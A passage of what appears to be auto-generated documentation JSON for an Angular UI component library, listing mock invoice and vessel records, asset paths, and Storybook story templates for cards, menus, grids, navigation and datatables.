15029,\r\n    vesselName: 'Blue Skullcap',\r\n    allocated: 464448,\r\n    total: 483236\r\n  }, {\r\n    invoiceNo: 204028785,\r\n    voyageNo: 17325,\r\n    vesselName: 'Coca',\r\n    allocated: 412084,\r\n    total: 319574\r\n  }, {\r\n    invoiceNo: 215898267,\r\n    voyageNo: 17556,\r\n    vesselName: 'Fendler\\'s Pennycress',\r\n    allocated: 467666,\r\n    total: 401105\r\n  }, {\r\n    invoiceNo: 283652560,\r\n    voyageNo: 16693,\r\n    vesselName: 'Densespike Blazing Star',\r\n    allocated: 428117,\r\n    total: 422318\r\n  }, {\r\n    invoiceNo: 261627486,\r\n    voyageNo: 16742,\r\n    vesselName: 'Texas Crab Apple',\r\n    allocated: 445829,\r\n    total: 389401\r\n  }, {\r\n    invoiceNo: 224657257,\r\n    voyageNo: 17344,\r\n    vesselName: 'Philodendron',\r\n    allocated: 439503,\r\n    total: 197357\r\n  }, {\r\n    invoiceNo: 287799672,\r\n    voyageNo: 18559,\r\n    vesselName: 'Knife Acacia',\r\n    allocated: 457225,\r\n    total: 152586\r\n  }, {\r\n    invoiceNo: 249855102,\r\n    voyageNo: 17210,\r\n    vesselName: 'Catnip Noseburn',\r\n    allocated: 490793,\r\n    total: 295054\r\n  }, {\r\n    invoiceNo: 217932979,\r\n    voyageNo: 18294,\r\n    vesselName: 'Brickellbush Goldenweed',\r\n    allocated: 476987,\r\n    total: 90357\r\n  }, {\r\n    invoiceNo: 287187542,\r\n    voyageNo: 18123,\r\n    vesselName: 'Threecornerjack',\r\n    allocated: 436103,\r\n    total: 98431\r\n  }, {\r\n    invoiceNo: 277359566,\r\n    voyageNo: 17549,\r\n    vesselName: 'Longleaf Isodendrion',\r\n    allocated: 456456,\r\n    total: 292117\r\n  }, {\r\n    invoiceNo: 250935681,\r\n    voyageNo: 16429,\r\n    vesselName: 'Purple False Gilyflower',\r\n    allocated: 465653,\r\n    total: 396830\r\n  }, {\r\n    invoiceNo: 261927204,\r\n    voyageNo: 16524,\r\n    vesselName: 'Nevada Pea',\r\n    allocated: 411190,\r\n    total: 393332\r\n  }, {\r\n    invoiceNo: 203826163,\r\n    voyageNo: 17608,\r\n    vesselName: 'Alaska Tall Bluebells',\r\n    allocated: 487745,\r\n    total: 273514\r\n  }, {\r\n    invoiceNo: 253006185,\r\n    voyageNo: 17795,\r\n    vesselName: 'Cupped Monolopia',\r\n    allocated: 491265,\r\n    total: 117277\r\n  }, {\r\n    invoiceNo: 212369622,\r\n    voyageNo: 17867,\r\n    vesselName: 'Small Rocklettuce',\r\n    allocated: 408880,\r\n    total: 530690\r\n  }, {\r\n    invoiceNo: 259555515,\r\n    voyageNo: 16488,\r\n    vesselName: 'Torchwood',\r\n    allocated: 428843,\r\n    total: 63208\r\n  }, {\r\n    invoiceNo: 209064476,\r\n    voyageNo: 17957,\r\n    vesselName: 'Saline Saltbush',\r\n    allocated: 452602,\r\n    total: 144560\r\n  }, {\r\n    invoiceNo: 246761266,\r\n    voyageNo: 18253,\r\n    vesselName: 'White Snakeroot',\r\n    allocated: 485075,\r\n    total: 133101\r\n  }, {\r\n    invoiceNo: 277989052,\r\n    voyageNo: 15535,\r\n    vesselName: 'Bayberry',\r\n    allocated: 411595,\r\n    total: 549473\r\n  }, {\r\n    invoiceNo: 246327302,\r\n    voyageNo: 17427,\r\n    vesselName: 'China Violet',\r\n    allocated: 426753,\r\n    total: 406017\r\n  }, {\r\n    invoiceNo: 225951335,\r\n    voyageNo: 15473,\r\n    vesselName: 'Olympic Saxifrage',\r\n    allocated: 429650,\r\n    total: 413380\r\n  }, {\r\n    invoiceNo: 206579573,\r\n    voyageNo: 17600,\r\n    vesselName: 'False Sun-rose',\r\n    allocated: 464983,\r\n    total: 474611\r\n  }, {\r\n    invoiceNo: 243806520,\r\n    voyageNo: 15148,\r\n    vesselName: 'Bracted Lousewort',\r\n    allocated: 486907,\r\n    total: 419416\r\n  }, {\r\n    invoiceNo: 248037555,\r\n    voyageNo: 16554,\r\n    vesselName: 'Beach Strawberry',\r\n    allocated: 446762,\r\n    total: 543982\r\n  }, {\r\n    invoiceNo: 233807782,\r\n    voyageNo: 18251,\r\n    vesselName: 'Western Bog Yellowcress',\r\n    allocated: 485749,\r\n    total: 206612\r\n  }, {\r\n    invoiceNo: 231399318,\r\n    voyageNo: 18647,\r\n    vesselName: 'Nevada Pea',\r\n    allocated: 416624,\r\n    total: 73797\r\n  }, {\r\n    invoiceNo: 210265421,\r\n    voyageNo: 17334,\r\n    vesselName: 'Silver Bird\\'s-foot Trefoil',\r\n    allocated: 493556,\r\n    total: 485404\r\n  }, {\r\n    invoiceNo: 270110020,\r\n    voyageNo: 15750,\r\n    vesselName: 'Dotted Lancepod',\r\n    allocated: 439009,\r\n    total: 85163\r\n  }, {\r\n    invoiceNo: 203365491,\r\n    voyageNo: 15574,\r\n    vesselName: 'Arizona Whitefeather',\r\n    allocated: 424981,\r\n    total: 72976\r\n  }, {\r\n    invoiceNo: 258026382,\r\n    voyageNo: 17991,\r\n    vesselName: 'Rough Blackfoot',\r\n    allocated: 412805,\r\n    total: 525915\r\n  }, {\r\n    invoiceNo: 216800989,\r\n    voyageNo: 18938,\r\n    vesselName: 'Narrowleaf Wirelettuce',\r\n    allocated: 437679,\r\n    total: 384426\r\n  }, {\r\n    invoiceNo: 224161270,\r\n    voyageNo: 15475,\r\n    vesselName: 'Utah Sweetvetch',\r\n    allocated: 414735,\r\n    total: 398700\r\n  }, {\r\n    invoiceNo: 224587536,\r\n    voyageNo: 16133,\r\n    vesselName: 'Palau Horsfieldia',\r\n    allocated: 409836,\r\n    total: 55599\r\n  }, {\r\n    invoiceNo: 200019644,\r\n    voyageNo: 16430,\r\n    vesselName: 'Cracked Lichen',\r\n    allocated: 491135,\r\n    total: 400179\r\n  }, {\r\n    invoiceNo: 212973644,\r\n    voyageNo: 16527,\r\n    vesselName: 'California Valerian',\r\n    allocated: 465742,\r\n    total: 428281\r\n  }, {\r\n    invoiceNo: 236726871,\r\n    voyageNo: 15145,\r\n    vesselName: 'Spear Saltbush',\r\n    allocated: 420067,\r\n    total: 236753\r\n  }, {\r\n    invoiceNo: 262498296,\r\n    voyageNo: 16350,\r\n    vesselName: 'Rose Globemallow',\r\n    allocated: 472387,\r\n    total: 270655\r\n  }, {\r\n    invoiceNo: 237959767,\r\n    voyageNo: 18739,\r\n    vesselName: 'Cithara Buckwheat',\r\n    allocated: 447466,\r\n    total: 358262\r\n  }, {\r\n    invoiceNo: 200461954,\r\n    voyageNo: 18921,\r\n    vesselName: 'Rough Potato',\r\n    allocated: 425594,\r\n    total: 459497\r\n  }, {\r\n    invoiceNo: 266033549,\r\n    voyageNo: 16150,\r\n    vesselName: 'Distictis',\r\n    allocated: 447636,\r\n    total: 286350\r\n  }, {\r\n    invoiceNo: 289893009,\r\n    voyageNo: 18219,\r\n    vesselName: 'Piedmont False Pimpernel',\r\n    allocated: 474098,\r\n    total: 163688\r\n  }, {\r\n    invoiceNo: 241320630,\r\n    voyageNo: 15558,\r\n    vesselName: 'Southern Mexican Sage',\r\n    allocated: 431537,\r\n    total: 419734\r\n  }, {\r\n    invoiceNo: 211404482,\r\n    voyageNo: 18502,\r\n    vesselName: 'Bearded Sprangletop',\r\n    allocated: 458939,\r\n    total: 89714\r\n  }, {\r\n    invoiceNo: 247917426,\r\n    voyageNo: 18238,\r\n    vesselName: 'Small-flowered Calycadenia',\r\n    allocated: 406198,\r\n    total: 351785\r\n  }, {\r\n    invoiceNo: 234633032,\r\n    voyageNo: 17269,\r\n    vesselName: 'Pritchardia',\r\n    allocated: 442188,\r\n    total: 414638\r\n  }, {\r\n    invoiceNo: 216477974,\r\n    voyageNo: 15454,\r\n    vesselName: 'Thread Lichen',\r\n    allocated: 474232,\r\n    total: 537142\r\n  }, {\r\n    invoiceNo: 201667786,\r\n    voyageNo: 15130,\r\n    vesselName: 'Margined Stickseed',\r\n    allocated: 493253,\r\n    total: 364145\r\n  }, {\r\n    invoiceNo: 271891491,\r\n    voyageNo: 15468,\r\n    vesselName: 'Eggleaf Milkwort',\r\n    allocated: 457747,\r\n    total: 316780\r\n  }, {\r\n    invoiceNo: 223744528,\r\n    voyageNo: 16074,\r\n    vesselName: 'Hall\\'s Mule-ears',\r\n    allocated: 439241,\r\n    total: 301239\r\n  }, {\r\n    invoiceNo: 202936481,\r\n    voyageNo: 18868,\r\n    vesselName: 'Rinodina Lichen',\r\n    allocated: 488291,\r\n    total: 504547\r\n  }, {\r\n    invoiceNo: 284610720,\r\n    voyageNo: 17077,\r\n    vesselName: 'Saber Bogmat',\r\n    allocated: 417817,\r\n    total: 246511\r\n  }, {\r\n    invoiceNo: 286535852,\r\n    voyageNo: 15935,\r\n    vesselName: 'Brodiaea',\r\n    allocated: 479989,\r\n    total: 276206\r\n  }, {\r\n    invoiceNo: 206000446,\r\n    voyageNo: 17528,\r\n    vesselName: 'Utah Serviceberry',\r\n    allocated: 454837,\r\n    total: 399887\r\n  }, {\r\n    invoiceNo: 283036494,\r\n    voyageNo: 16899,\r\n    vesselName: 'Lehua Makanoe',\r\n    allocated: 452547,\r\n    total: 96023\r\n  }, {\r\n    invoiceNo: 270371913,\r\n    voyageNo: 16886,\r\n    vesselName: 'Rim Lichen',\r\n    allocated: 439082,\r\n    total: 269557\r\n  }, {\r\n    invoiceNo: 273513209,\r\n    voyageNo: 15570,\r\n    vesselName: 'Andrews\\' Rhizomnium Moss',\r\n    allocated: 471494,\r\n    total: 131750\r\n  }, {\r\n    invoiceNo: 215244773,\r\n    voyageNo: 17618,\r\n    vesselName: 'Lesser Pond Sedge',\r\n    allocated: 472422,\r\n    total: 505921\r\n  }, {\r\n    invoiceNo: 264815411,\r\n    voyageNo: 17008,\r\n    vesselName: 'Browne\\'s Savory',\r\n    allocated: 464834,\r\n    total: 420180\r\n  }, {\r\n    invoiceNo: 260793904,\r\n    voyageNo: 18868,\r\n    vesselName: 'Bastard Copperleaf',\r\n    allocated: 403983,\r\n    total: 190831\r\n  }, {\r\n    invoiceNo: 228919503,\r\n    voyageNo: 16736,\r\n    vesselName: 'Himalayan Cypress',\r\n    allocated: 418664,\r\n    total: 450233\r\n  }, {\r\n    invoiceNo: 225534860,\r\n    voyageNo: 18374,\r\n    vesselName: 'Fiddleleaf Hawksbeard',\r\n    allocated: 495477,\r\n    total: 528500\r\n  }, {\r\n    invoiceNo: 205039289,\r\n    voyageNo: 15221,\r\n    vesselName: 'Maui Cyanea',\r\n    allocated: 434081,\r\n    total: 79021\r\n  }, {\r\n    invoiceNo: 219730920,\r\n    voyageNo: 18931,\r\n    vesselName: 'Garden Sorrel',\r\n    allocated: 442584,\r\n    total: 193166\r\n  }, {\r\n    invoiceNo: 229994865,\r\n    voyageNo: 16404,\r\n    vesselName: 'Waialeale Dubautia',\r\n    allocated: 414377,\r\n    total: 195495\r\n  }, {\r\n    invoiceNo: 289807557,\r\n    voyageNo: 16151,\r\n    vesselName: 'Onetooth Woodfern',\r\n    allocated: 415673,\r\n    total: 202974\r\n  }, {\r\n    invoiceNo: 289750833,\r\n    voyageNo: 15827,\r\n    vesselName: 'Greenland Orange Lichen',\r\n    allocated: 416432,\r\n    total: 146021\r\n  }, {\r\n    invoiceNo: 243948439,\r\n    voyageNo: 18154,\r\n    vesselName: 'Leafy Reedgrass',\r\n    allocated: 441439,\r\n    total: 248631\r\n  }, {\r\n    invoiceNo: 266718010,\r\n    voyageNo: 15322,\r\n    vesselName: 'Largeleaf Marshpennywort',\r\n    allocated: 436736,\r\n    total: 256997\r\n  }, {\r\n    invoiceNo: 285338933,\r\n    voyageNo: 18884,\r\n    vesselName: 'Musk Okra',\r\n    allocated: 414918,\r\n    total: 475276\r\n  }, {\r\n    invoiceNo: 284544908,\r\n    voyageNo: 16825,\r\n    vesselName: 'Stegonia Moss',\r\n    allocated: 486396,\r\n    total: 210718\r\n  }, {\r\n    invoiceNo: 200951860,\r\n    voyageNo: 15681,\r\n    vesselName: 'Black Rock Townsend Daisy',\r\n    allocated: 437133,\r\n    total: 358340\r\n  }, {\r\n    invoiceNo: 248838992,\r\n    voyageNo: 18254,\r\n    vesselName: 'Kern Canyon Clarkia',\r\n    allocated: 414245,\r\n    total: 164454\r\n  }, {\r\n    invoiceNo: 274109340,\r\n    voyageNo: 18252,\r\n    vesselName: 'Squarrose Knapweed',\r\n    allocated: 408814,\r\n    total: 159690\r\n  }, {\r\n    invoiceNo: 219721177,\r\n    voyageNo: 16331,\r\n    vesselName: 'Lake County Dwarf-flax',\r\n    allocated: 496150,\r\n    total: 404922\r\n  }, {\r\n    invoiceNo: 272212685,\r\n    voyageNo: 15395,\r\n    vesselName: 'Ferngrass',\r\n    allocated: 432853,\r\n    total: 191127\r\n  }, {\r\n    invoiceNo: 243182762,\r\n    voyageNo: 18321,\r\n    vesselName: 'Marsh Grass',\r\n    allocated: 462472,\r\n    total: 452940\r\n  }, {\r\n    invoiceNo: 277839539,\r\n    voyageNo: 17421,\r\n    vesselName: 'Prairie Straw Sedge',\r\n    allocated: 406837,\r\n    total: 271284\r\n  }, {\r\n    invoiceNo: 207952597,\r\n    voyageNo: 17197,\r\n    vesselName: 'Doublehorn Calicoflower',\r\n    allocated: 477735,\r\n    total: 400959\r\n  }, {\r\n    invoiceNo: 260636315,\r\n    voyageNo: 15453,\r\n    vesselName: 'Palmer\\'s Goldenrod',\r\n    allocated: 450419,\r\n    total: 309897\r\n  }, {\r\n    invoiceNo: 256449906,\r\n    voyageNo: 15189,\r\n    vesselName: 'Oregon Checkerbloom',\r\n    allocated: 435139,\r\n    total: 139814\r\n  }, {\r\n    invoiceNo: 230023430,\r\n    voyageNo: 15665,\r\n    vesselName: 'Duckweed',\r\n    allocated: 449282,\r\n    total: 209512\r\n  }, {\r\n    invoiceNo: 226217229,\r\n    voyageNo: 18462,\r\n    vesselName: 'Disc Lichen',\r\n    allocated: 471214,\r\n    total: 58962\r\n  }, {\r\n    invoiceNo: 239201753,\r\n    voyageNo: 18676,\r\n    vesselName: 'Antifever Fontinalis Moss',\r\n    allocated: 456585,\r\n    total: 146024\r\n  }, {\r\n    invoiceNo: 235303844,\r\n    voyageNo: 16223,\r\n    vesselName: 'Miracle Fruit',\r\n    allocated: 467877,\r\n    total: 150931\r\n  }, {\r\n    invoiceNo: 217943418,\r\n    voyageNo: 15418,\r\n    vesselName: 'Little Gumweed',\r\n    allocated: 494402,\r\n    total: 355363\r\n  }, {\r\n    invoiceNo: 289788898,\r\n    voyageNo: 15038,\r\n    vesselName: 'Parish\\'s Oxytheca',\r\n    allocated: 464853,\r\n    total: 472823\r\n  }, {\r\n    invoiceNo: 280499130,\r\n    voyageNo: 18914,\r\n    vesselName: 'Jelly Lichen',\r\n    allocated: 486477,\r\n    total: 522679\r\n  }, {\r\n    invoiceNo: 223812339,\r\n    voyageNo: 18298,\r\n    vesselName: 'Evermann\\'s Fleabane',\r\n    allocated: 453418,\r\n    total: 50034\r\n  }, {\r\n    invoiceNo: 226331833,\r\n    voyageNo: 17046,\r\n    vesselName: 'Munj Sweetcane',\r\n    allocated: 442239,\r\n    total: 447072\r\n  }, {\r\n    invoiceNo: 226842057,\r\n    voyageNo: 16491,\r\n    vesselName: 'Trichostomum Moss',\r\n    allocated: 450732,\r\n    total: 471203\r\n  }, {\r\n    invoiceNo: 218377093,\r\n    voyageNo: 18157,\r\n    vesselName: 'Brown Stringybark',\r\n    allocated: 441668,\r\n    total: 464837\r\n  }, {\r\n    invoiceNo: 282690677,\r\n    voyageNo: 16864,\r\n    vesselName: 'Whorled Milkwort',\r\n    allocated: 424456,\r\n    total: 241177\r\n  } ]"
          },
          {
            "name": "scss",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "tools/scripts/copy-assets.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "path.join(src, 'style/**/*')"
          },
          {
            "name": "SingleSelect",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<Record<string, >>",
            "defaultValue": "(args) => ( {\r\n  props: { ...args },\r\n  template: `\r\n<mat-card style=\"width: 300px\" class=\"sto-form\" >\r\n    <mat-form-field  class=\"sto-form__field\" floatLabel=\"always\">\r\n    <mat-label>Select with filter</mat-label>\r\n      <mat-select [multiple]=\"false\" [value]=\"selected\">\r\n        <sto-select-filter (keydown.space)=\"$event.stopPropagation()\"\r\n                           [isFilter]=\"isFilter\"\r\n                           [focusIfNoValue]=\"focusIfNoValue\"\r\n                           [isMulti]=\"false\"\r\n                           (valueChanges)=\"filteredItems = filter($event, allItems)\"></sto-select-filter>\r\n        <mat-option *ngFor=\"let opt of filteredItems\"\r\n                    [value]=\"opt\">{{opt.name}}</mat-option>\r\n      </mat-select>\r\n    </mat-form-field>\r\n</mat-card>`\r\n} )"
          },
          {
            "name": "src",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "tools/scripts/copy-assets.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "path.join(root, 'libs', 'core', 'src')"
          },
          {
            "name": "StoCard",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/core/src/lib/styles.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<literal type>",
            "defaultValue": "(args) => ( {\r\n  props: { ...args },\r\n  template: `<mat-card [class.sto-card]=\"withStyles\">\r\n<mat-card-title [class.sto-card__title]=\"withStyles\">Card Title</mat-card-title>\r\n<mat-card-subtitle [class.sto-card__subtitle]=\"withStyles\">Card Subtitle</mat-card-subtitle>\r\n<mat-card-content [class.sto-card__content]=\"withStyles\">Card Content In Here</mat-card-content>\r\n</mat-card>`\r\n} )"
          },
          {
            "name": "StoContextMenu",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/core/src/lib/sto-directives/directives.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "() => ( {\r\n  props: {\r\n    closed: action('Menu closed'),\r\n    log: action('Active menu info')\r\n  },\r\n  template: `<mat-card>\r\n<mat-card-title>Context menu</mat-card-title>\r\n  <button\r\n#overlay=\"stoMenuOverlay\"\r\n[matMenuTriggerRestoreFocus]=\"false\"\r\n(menuClosed)=\"closed()\"\r\nmat-button stoMenuOverlay #trigger=\"matMenuTrigger\" [matMenuTriggerFor]=\"menu\">Menu trigger button</button>\r\n<br>\r\n<br>\r\n<p>\r\n  Active Menu Index {{ activeMenuInfo }}\r\n</p>\r\n<br>\r\n<br>\r\n<div style=\"width: 500px; display: flex; justify-content: space-between\">\r\n<span [menuContext]=\"{index: 0}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 0</span>\r\n<span [menuContext]=\"{index: 1}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 1</span>\r\n<span [menuContext]=\"{index: 2}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 2</span>\r\n<span [menuContext]=\"{index: 3}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 3</span>\r\n</div>\r\n\r\n<mat-menu [backdropClass]=\"'backdrop-remove'\" [hasBackdrop]=\"false\" #menu=\"matMenu\">\r\n  <ng-template matMenuContent let-index=\"index\">\r\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log('index', index, $event)\">Index {{ index }}</button>\r\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log(1, $event)\">Item 1</button>\r\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log(2, $event)\">Item 2</button>\r\n  </ng-template>\r\n</mat-menu>\r\n</mat-card>`\r\n} )"
          },
          {
            "name": "StoDialog",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/core/src/lib/styles.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<Record<string, >>",
            "defaultValue": "(args) => ( {\r\n  props: { ...args },\r\n  template: `<app-dialog-demo [separatorLines]=\"separatorLines\"></app-dialog-demo>`,\r\n} )"
          },
          {
            "name": "StoGrid",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/core/src/lib/sto-directives/directives.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "defaultValue": "(args: Record<string, unknown>) => ( {\r\n  props: { ...args },\r\n  template: `<mat-card class=\"sto-card\">\r\n<div style=\"background: white;\" stoGrid [maxWidth]=\"1000\" [breakpoints]=\"breakpoints\">\r\n<div stoGridColumn style=\"background: lightblue;\">1 (col)</div>\r\n<div stoGridColumn style=\"background: lightblue;\">2 (col)</div>\r\n<div stoGridColumn style=\"background: lightblue;\">3 (col)</div>\r\n<div stoGridColumn style=\"background: lightblue;\">4 (col)</div>\r\n<div stoGridColumn style=\"background: lightblue;\">5 (col)</div>\r\n<div stoGridColumn style=\"background: lightblue;\">6 (col)</div>\r\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">7 (double col)</div>\r\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">8 (double col)</div>\r\n<div stoGridColumn [stoGridColumnDouble]=\"true\" stoGridSpacer>9 (double spacer, hidden on 2-col)</div>\r\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">10 (double col)</div>\r\n<div stoGridColumn style=\"background: lightblue;\">11 (col)</div>\r\n<div stoGridColumn stoGridSpacer>12 (spacer, hidden on 1-col)</div>\r\n<div stoGridColumn style=\"background: transparent;\" class=\"sto-form\"></div>\r\n<div stoGridColumn stoGridSpacer style=\"background: lightblue;\">13 (col spacer, hidden on 1-col grid)</div>\r\n<div stoGridColumn stoGridSpacer style=\"background: lightblue;\" [stoGridColumnDouble]=\"true\" >14 (double spacer, hidden on 2-col)</div>\r\n</div>\r\n</mat-card>`\r\n} )"
          },
          {
            "name": "StoTheme",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/core/src/lib/styles.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<Record<string, >>",
            "defaultValue": "args => ( {\r\n  props: { ...args, colors: [ 'primary', 'accent', 'warn', 'warning', 'success', 'danger' ] },\r\n  styles: [\r\n    `\r\n    .container { display: flex; }\r\n    .container > div {\r\n     flex: 0 1 auto;\r\n     padding-left: 16px;\r\n     }\r\n    `\r\n  ],\r\n  template: `\r\n  <mat-tab-group>\r\n  <mat-tab label=\"Buttons\">\r\n    <mat-card class=\"sto-card\">\r\n    <div *ngFor=\"let color of colors\">\r\n      <mat-card-subtitle class=\"sto-card__subtitle\">\r\n    <h2>{{ color }}</h2>\r\n</mat-card-subtitle>\r\n    <button mat-button [color]=\"color\">Mat Button</button>\r\n    <button mat-stroked-button [color]=\"color\">Mat stroked Button</button>\r\n    <button mat-flat-button [color]=\"color\">Mat flat Button</button>\r\n    <button mat-raised-button [color]=\"color\">Mat raised Button</button>\r\n    <button mat-icon-button [color]=\"color\"><mat-icon>home</mat-icon></button>\r\n</div>\r\n</mat-card>\r\n  </mat-tab>\r\n  <mat-tab label=\"Cards\">\r\n  <mat-card *ngFor=\"let c of colors\" [ngClass]=\"'mat-' + c\">\r\n  <mat-card-title>{{ c }}</mat-card-title>\r\n</mat-card>\r\n</mat-tab>\r\n<mat-tab label=\"Text\">\r\n<mat-card class=\"sto-card\">\r\n    <div class=\"container\">\r\n    <div>\r\n    <p *ngFor=\"let color of colors\" [ngClass]=\"'mat-' + color\">&lt;p&gt; {{ color }}</p>\r\n</div>\r\n<div>\r\n    <span *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\r\n    &lt;span&gt; {{ color }}\r\n</span>\r\n</div>\r\n<div>\r\n    <h2 *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\r\n    &lt;h[1|2|3|4|5]&gt; {{ color }}\r\n</h2>\r\n</div>\r\n</div>\r\n</mat-card>\r\n</mat-tab>\r\n</mat-tab-group>\r\n  `,\r\n} )"
          },
          {
            "name": "subNavigation",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/drawer/src/lib/sto-navigation/navigation.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "object",
            "defaultValue": "{\r\n  'name': 'Application 2',\r\n  'groups': [\r\n    {\r\n      'name': null,\r\n      'items': [\r\n        {\r\n          'icon': 'date_range',\r\n          'name': 'Section 1',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '1'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        },\r\n        {\r\n          'icon': 'format_list_bulleted',\r\n          'name': 'Section 2',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '2'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        },\r\n        {\r\n          'icon': 'train',\r\n          'name': 'Section 3',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '3'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        },\r\n        {\r\n          'icon': 'access_time',\r\n          'name': 'Section 4',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '4'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        },\r\n        {\r\n          'icon': 'description',\r\n          'name': 'Section 5',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '5'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        }\r\n      ],\r\n      'hasDivider': false,\r\n      'svgIcon': false,\r\n      'icon': null\r\n    },\r\n    {\r\n      'name': null,\r\n      'items': [\r\n        {\r\n          'icon': 'train',\r\n          'name': 'SubSection 1',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '11'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        },\r\n        {\r\n          'icon': 'person',\r\n          'name': 'SubSection 2',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '12'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        },\r\n        {\r\n          'icon': 'business',\r\n          'name': 'SubSection 3',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              'SubSection 13'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        },\r\n        {\r\n          'icon': 'settings',\r\n          'name': 'SubSection 4',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '4'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        }\r\n      ],\r\n      'hasDivider': true,\r\n      'svgIcon': false,\r\n      'icon': null\r\n    }\r\n  ]\r\n}"
          },
          {
            "name": "Success",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<StoMessagePanelComponent>",
            "defaultValue": "(args: StoMessagePanelComponent) => {\r\n  return {\r\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"success\" [dismissable]=\"false\" icon=\"info\">Warning Text Content</sto-message-panel>'\r\n  };\r\n}"
          },
          {
            "name": "Template",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/datatable/src/lib/swimlane-table.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<Record<string, >>",
            "defaultValue": "(args: Record<string, unknown>) => {\r\n  return {\r\n    props: args,\r\n    template: `<mat-card>\r\n<mat-card-title><h2>This replaces StoComplexDatatable and is only here for CSS</h2></mat-card-title>\r\n<ngx-datatable [loadingIndicator]=\"loading\"\r\n[footerHeight]=\"40\"\r\n[selectionType]=\"'single'\"\r\n[scrollbarV]=\"true\"\r\n[scrollbarH]=\"horizontalScroll\"\r\n[style.height.px]=\"height\"\r\n[rowHeight]=\"rowHeight\"\r\n[headerHeight]=\"headerHeight\"\r\n[class.sto-datatable]=\"withCss\"\r\n[rows]=\"rows\"\r\n[columns]=\"columns\"></ngx-datatable>\r\n</mat-card>`\r\n  };\r\n}"
          },
          {
            "name": "Template",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/error-handler/src/lib/error-handler.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<Record<string, >>",
            "defaultValue": "(args: Record<string, unknown> ) => {\r\n  return {\r\n    props: args,\r\n    template: `<next-wrapper></next-wrapper>`,\r\n  };\r\n}"
          },
          {
            "name": "Template",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<StoActionFooterComponent>",
            "defaultValue": "(args: StoActionFooterComponent) => {\r\n  return {\r\n    component: StoActionFooterComponent,\r\n    props: {\r\n      ...args,\r\n      save: action('Save'),\r\n      cancel: action('Cancel')\r\n    },\r\n    template: '<sto-action-footer [isLoading]=\"isLoading\" [position]=\"position\" [shouldAddClass]=\"shouldAddClass\"><button mat-flat-button (click)=\"save()\" color=\"primary\">Save</button><button (click)=\"cancel()\" mat-button>Cancel</button></sto-action-footer>'\r\n  };\r\n}"
          },
          {
            "name": "Template",
            "ctype": "miscellaneous",
            "subtype": "variable",
            "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Story<>",
